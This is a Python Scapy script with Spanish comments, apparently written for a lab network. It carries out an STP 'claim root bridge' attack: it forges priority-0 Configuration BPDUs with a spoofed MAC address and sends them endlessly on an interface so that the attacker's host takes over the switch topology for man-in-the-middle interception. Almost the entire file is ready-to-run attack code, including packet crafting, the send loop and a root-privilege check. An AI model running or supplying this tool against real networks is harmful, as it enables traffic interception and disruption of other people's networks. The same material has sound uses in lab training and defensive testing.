#!/usr/bin/env python3
"""
STP Claim Root Bridge Attack Script
Manipula el Spanning Tree Protocol para convertir al atacante en Root Bridge
enviando BPDUs (Bridge Protocol Data Units) con prioridad 0 (máxima prioridad).
Esto permite al atacante controlar la topología de la red y ejecutar
ataques Man-in-the-Middle (MitM).

Topología:
- Root Bridge Legítimo (S1): 192.168.11.1
- Switch S2: 192.168.11.2
- Switch S3: 192.168.11.3
- Atacante (Kali): 192.168.11.240
- Red Víctimas: 192.168.11.0/24

Uso: sudo python3 stp_attack.py
"""

from scapy.all import *
import sys
import time

# Configuración del ataque STP
ROOT_MAC = "50:d3:4d:00:05:00"        # MAC del atacante para spoofing
BRIDGE_PRIORITY = 0                    # Prioridad 0 = máxima (menor valor gana)
ROOT_ID = 0                            # ID del Root Bridge (nuestro atacante)
INTERFACE = "eth0"                     # Interfaz de red a usar


def craft_stp_bpdu():
    """
    Construye un paquete BPDU de configuración STP malicioso.
    La prioridad 0 es máxima en STP, por lo que ganará la elección de Root Bridge.
    
    Returns:
        packet: Paquete Scapy con BPDU STP malicioso
    """
    
    # Ether: Frame Ethernet con MAC multicast STP (01:80:c2:00:00:00)
    # Todos los switches escuchan en esta dirección multicast
    eth_layer = Ether(
        src=ROOT_MAC,                  # MAC del atacante
        dst="01:80:c2:00:00:00"       # MAC multicast de STP
    )
    
    # LLC (Logical Link Control): Protocolo de control de enlace
    # dsap=0x42, ssap=0x42 identifican el tipo de protocolo (STP)
    llc_layer = LLC(
        dsap=0x42,
        ssap=0x42,
        ctrl=0x03
    )
    
    # STP: Bridge Protocol Data Unit de configuración
    # Este es el paquete principal que manipula la topología STP
    stp_layer = STP(
        bpdutype=0x00,                # Tipo 0x00 = Configuration BPDU
        bpduflags=0xc0,              # Flags: TC (Topology Change) + TCA
        rootmac=ROOT_MAC,             # El atacante es el nuevo Root Bridge
        rootpc=0,                     # Root Path Cost = 0 (mejor ruta)
        bridgemac=ROOT_MAC,           # Bridge ID = MAC del atacante
        portid=0x8002,                # Puerto 2
        age=1,                        # Message Age = 1
        maxage=20,                    # Max Age = 20
        hello=2,                      # Hello Time = 2
        fwddelay=15                   # Forward Delay = 15
    )
    
    # Ensamblar el paquete completo: Ethernet -> LLC -> STP
    packet = eth_layer / llc_layer / stp_layer
    
    return packet


def stp_root_bridge_attack(interface=INTERFACE, interval=2):
    """
    Ejecuta el ataque STP Claim Root Bridge enviando BPDUs maliciosas
    en un bucle infinito para mantener el rol de Root Bridge.
    
    Args:
        interface: Interfaz de red a usar
        interval: Intervalo en segundos entre cada BPDU (default: 2)
    """
    
    print("[*] Iniciando STP Claim Root Bridge Attack")
    print(f"[*] Interfaz: {interface}")
    print(f"[*] MAC del Atacante (Spoofed Root): {ROOT_MAC}")
    print(f"[*] Prioridad del Root Bridge: {BRIDGE_PRIORITY} (MÁXIMA)")
    print(f"[*] Intervalo entre BPDUs: {interval}s")
    print("[*] Enviando BPDUs maliciosas para reclamar Root Bridge...")
    print("[*] Presiona Ctrl+C para detener el ataque\n")
    
    packet_count = 0
    
    try:
        # Bucle infinito: continuar enviando BPDUs para mantener el rol de Root
        while True:
            
            # Construir el BPDU malicioso
            bpdu_packet = craft_stp_bpdu()
            
            # Enviar el paquete de ataque
            sendp(bpdu_packet, iface=interface, verbose=False)
            
            packet_count += 1
            
            # Mostrar progreso
            print(f"[+] BPDU #{packet_count} enviado - Atacante como Root Bridge")
            print(f"    Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Los switches están recibiendo esta BPDU y reconfiguran su topología
            # porque Prioridad 0 < 32768 (prioridad por defecto de switches legítimos)
            # Los puertos cambiarán de estado:
            # - Algunos pasarán a BLOCKING (no envían datos)
            # - Otros pasarán a FORWARDING (envían datos a través del atacante)
            print(f"    Resultado: Reconfiguración STP en progreso...\n")
            
            # Esperar antes de enviar el siguiente BPDU
            # En STP real, los hellos se envían cada 2 segundos por defecto
            time.sleep(interval)
    
    except PermissionError:
        print("[-] Error: Se requieren permisos de root (sudo)")
        sys.exit(1)
        
    except KeyboardInterrupt:
        print(f"\n[*] Ataque detenido por el usuario")
        print(f"[*] Total de BPDUs enviadas: {packet_count}")
        print("[*] Los switches deberían reconverger en 20-30 segundos")
        sys.exit(0)
        
    except Exception as e:
        print(f"[-] Error durante el ataque: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    # Verificar permisos de root
    import os
    if os.geteuid() != 0:
        print("[-] Este script requiere permisos de root")
        print("[*] Intenta: sudo python3 stp_attack.py")
        sys.exit(1)
    
    # Iniciar el ataque STP
    stp_root_bridge_attack()
